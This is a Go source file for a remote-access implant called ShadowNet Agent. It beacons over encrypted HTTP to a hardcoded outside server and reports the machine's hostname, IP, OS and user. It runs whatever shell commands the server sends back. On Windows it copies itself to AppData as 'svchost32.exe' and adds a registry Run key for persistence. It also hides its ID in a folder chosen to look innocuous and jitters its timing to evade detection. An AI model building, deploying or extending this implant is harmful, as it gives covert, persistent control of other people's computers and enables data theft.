package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/joho/godotenv"
)

/*
ShadowNet Agent
---------------
- Auto-registers on first beacon using registration secret
- AES-GCM encrypted communication
- Persistent agent ID (survives restarts)
- Task ACK + output reporting
- Jitter-based sleep to avoid pattern detection

BUILD COMMAND:
  go build -ldflags="-X main.serverURL=http://YOUR_SERVER:8080/beacon \
                     -X main.registrationSecret=YOUR_SECRET \
                     -X main.aesKeyStr=YOUR_32_BYTE_KEY_HERE" \
  -o agent main.go
*/

// =========================
// COMPILE TIME CONFIG
// Sentinels — replaced at build time via -ldflags, or overridden at
// runtime via environment variables / agent.env (for local dev).
// =========================

var (
	serverURL          = "https://shadownet.divysoni.me/beacon"
	registrationSecret = "UNSET_REGISTRATION_SECRET"
	aesKeyStr          = "UNSET_AES_KEY_32_BYTES_HERE!!!!!"
)

// =========================
// RUNTIME STATE
// =========================

var (
	secretKey     []byte
	agentID       = loadOrCreateAgentID()
	executedTasks = map[string]bool{}
	workingDir, _ = os.Getwd()
)

// =========================
// STRUCTS
// =========================

type Beacon struct {
	AgentID            string `json:"agent_id"`
	RegistrationSecret string `json:"registration_secret,omitempty"` // only on first beacon
	Status             string `json:"status,omitempty"`
	Ack                string `json:"ack,omitempty"`
	TaskID             string `json:"task_id,omitempty"`
	Output             string `json:"output,omitempty"`
	// Identity fields — sent only on first beacon during registration
	Hostname  string `json:"hostname,omitempty"`
	IPAddress string `json:"ip_address,omitempty"`
	OSInfo    string `json:"os_info,omitempty"`
	AgentUser string `json:"agent_user,omitempty"`
}

// getLocalIP returns the first non-loopback IPv4 address found.
func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// getAgentUser returns the OS username.
func getAgentUser() string {
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return os.Getenv("USER")
}

type Task struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

// =========================
// MAIN
// =========================

// Sentinel values that must never reach a real beacon.
const unsetRegistrationSecret = "UNSET_REGISTRATION_SECRET"
const unsetAESKey = "UNSET_AES_KEY_32_BYTES_HERE!!!!!"

func main() {
	// Load agent.env for local development (go run).
	// In production builds the values are baked in via -ldflags and this is a no-op.
	envFile := filepath.Join(filepath.Dir(os.Args[0]), "agent.env")
	if _, err := os.Stat(envFile); os.IsNotExist(err) {
		// Also check next to the source file when using go run
		envFile = filepath.Join(".", "agent.env")
	}
	_ = godotenv.Load(envFile)

	// Runtime env overrides (wins over compile-time sentinels)
	if v := os.Getenv("SHADOWNET_REGISTRATION_SECRET"); v != "" {
		registrationSecret = v
	}
	if v := os.Getenv("SHADOWNET_AES_KEY"); v != "" {
		aesKeyStr = v
	}
	if v := os.Getenv("SHADOWNET_SERVER_URL"); v != "" {
		serverURL = v
	}

	// Guard: refuse to run if secrets were never set
	if registrationSecret == unsetRegistrationSecret {
		fmt.Fprintln(os.Stderr, "[FATAL] registrationSecret not set. Set SHADOWNET_REGISTRATION_SECRET in agent.env or rebuild with -ldflags '-X main.registrationSecret=YOUR_SECRET'")
		os.Exit(1)
	}
	if aesKeyStr == unsetAESKey {
		fmt.Fprintln(os.Stderr, "[FATAL] aesKeyStr not set. Set SHADOWNET_AES_KEY in agent.env or rebuild with -ldflags '-X main.aesKeyStr=YOUR_32_BYTE_KEY'")
		os.Exit(1)
	}
	if len(aesKeyStr) != 32 {
		fmt.Fprintf(os.Stderr, "[FATAL] AES key must be exactly 32 bytes, got %d\n", len(aesKeyStr))
		os.Exit(1)
	}
	secretKey = []byte(aesKeyStr)

	// Install startup persistence (Windows only).
	// Copies the binary to AppData and adds a registry Run key.
	// Silent — errors are ignored so the agent still runs even if it can't persist.
	installPersistence()

	rand.Seed(time.Now().UnixNano())

	isFirstBeacon := true

	for {
		var b Beacon

		if isFirstBeacon {
			// First beacon: include registration secret + full identity
			hostname, _ := os.Hostname()
			b = Beacon{
				AgentID:            agentID,
				RegistrationSecret: registrationSecret,
				Status:             "alive",
				Hostname:           hostname,
				IPAddress:          getLocalIP(),
				OSInfo:             runtime.GOOS + "/" + runtime.GOARCH,
				AgentUser:          getAgentUser(),
			}
		} else {
			b = Beacon{
				AgentID: agentID,
				Status:  "alive",
			}
		}

		task := sendBeacon(b)

		if task == nil {
			sleepJitter()
			continue
		}

		// Got a valid response — registration succeeded
		isFirstBeacon = false

		// ACK the task
		sendBeacon(Beacon{
			AgentID: agentID,
			Ack:     task.ID,
		})

		if executedTasks[task.ID] {
			sleepJitter()
			continue
		}

		// Execute and report
		output := executeCommand(task.Cmd)
		executedTasks[task.ID] = true

		sendBeacon(Beacon{
			AgentID: agentID,
			TaskID:  task.ID,
			Output:  output,
		})

		sleepJitter()
	}
}

// =========================
// PERSISTENCE
// =========================

const (
	// Registry value name and the folder/file name used for the installed copy.
	// Change these at build time via -ldflags if you want different names.
	persistRegName = "WindowsSystemService"
	persistExeName = "svchost32.exe"
)

// installPersistence copies this binary into the user's AppData folder and
// registers it under HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// so it starts automatically on every login.
// Only runs on Windows. Safe to call multiple times — skips if already installed.
func installPersistence() {
	if runtime.GOOS != "windows" {
		return
	}

	// Destination: %APPDATA%\Microsoft\Windows\svchost32.exe
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return
	}
	destDir := filepath.Join(appData, "Microsoft", "Windows")
	destPath := filepath.Join(destDir, persistExeName)

	// Get the path of the currently running binary
	selfPath, err := os.Executable()
	if err != nil {
		return
	}
	selfPath, _ = filepath.EvalSymlinks(selfPath)

	// If we ARE already running from the destination, just ensure registry key exists
	if strings.EqualFold(selfPath, destPath) {
		_ = addRegistryRunKey(persistRegName, destPath)
		return
	}

	// Copy binary to destination
	os.MkdirAll(destDir, 0755)
	if err := copyFile(selfPath, destPath); err != nil {
		return
	}

	// Add registry Run key
	_ = addRegistryRunKey(persistRegName, destPath)
}

// addRegistryRunKey writes a value to HKCU Run so the binary starts on login.
func addRegistryRunKey(name, exePath string) error {
	cmd := exec.Command(
		"reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", name,
		"/t", "REG_SZ",
		"/d", exePath,
		"/f",
	)
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Run()
}

// copyFile copies src to dst, creating dst if necessary.
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// =========================
// BEACON
// =========================

func sendBeacon(b Beacon) *Task {
	raw, _ := json.Marshal(b)
	enc, err := encrypt(raw)
	if err != nil {
		return nil
	}

	body, _ := json.Marshal(map[string]string{"data": enc})
	resp, err := http.Post(serverURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil // silent fail — network issue
	}
	defer resp.Body.Close()

	if resp.StatusCode == 403 {
		// Registration secret wrong or agent explicitly blocked
		time.Sleep(30 * time.Second) // back off longer on auth failure
		return nil
	}

	if resp.StatusCode != 200 {
		return nil
	}

	var response map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return nil
	}

	dataField, ok := response["data"]
	if !ok {
		return nil
	}

	dec, err := decrypt(dataField)
	if err != nil {
		return nil
	}

	var msg struct {
		Task *Task `json:"task"`
	}
	json.Unmarshal(dec, &msg)
	return msg.Task
}

// =========================
// COMMAND EXECUTION
// =========================

func executeCommand(cmd string) string {
	cmd = strings.TrimSpace(cmd)

	if strings.HasPrefix(cmd, "cd ") {
		target := strings.TrimSpace(strings.TrimPrefix(cmd, "cd "))
		newDir := filepath.Join(workingDir, target)
		if err := os.Chdir(newDir); err != nil {
			return "cd failed: " + err.Error()
		}
		workingDir, _ = os.Getwd()
		return "directory changed to " + workingDir
	}

	var command *exec.Cmd
	if runtime.GOOS == "windows" {
		// chcp 65001 switches the console to UTF-8 before running the command
		// so output from dir, tasklist, etc. arrives as valid UTF-8
		command = exec.Command("cmd", "/C", "chcp 65001 >nul 2>&1 && "+cmd)
	} else {
		command = exec.Command("sh", "-c", cmd)
	}

	command.Dir = workingDir
	output, err := command.CombinedOutput()

	if err != nil {
		return err.Error() + "\n" + string(output)
	}
	return string(output)
}

// =========================
// ENCRYPTION (AES-GCM)
// =========================

func encrypt(data []byte) (string, error) {
	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(gcm.Seal(nonce, nonce, data, nil)), nil
}

func decrypt(enc string) ([]byte, error) {
	raw, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(raw) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	return gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], nil)
}

// =========================
// AGENT ID — persists across restarts
// =========================

func loadOrCreateAgentID() string {
	dir, err := os.UserConfigDir()
	if err != nil {
		dir = os.TempDir()
	}

	// Use a non-suspicious folder name
	path := filepath.Join(dir, ".sysconfig")
	os.MkdirAll(path, 0700)

	file := filepath.Join(path, "agent.dat")
	if data, err := os.ReadFile(file); err == nil {
		id := strings.TrimSpace(string(data))
		if len(id) > 0 {
			return id
		}
	}

	id := generateAgentID()
	os.WriteFile(file, []byte(id), 0600)
	return id
}

func generateAgentID() string {
	b := make([]byte, 8)
	crand.Read(b)
	return fmt.Sprintf("%x", b)
}

// =========================
// SLEEP WITH JITTER
// =========================

func sleepJitter() {
	base := 8
	jitter := rand.Intn(5) - 2
	sleep := base + jitter
	if sleep < 3 {
		sleep = 3
	}
	time.Sleep(time.Duration(sleep) * time.Second)
}
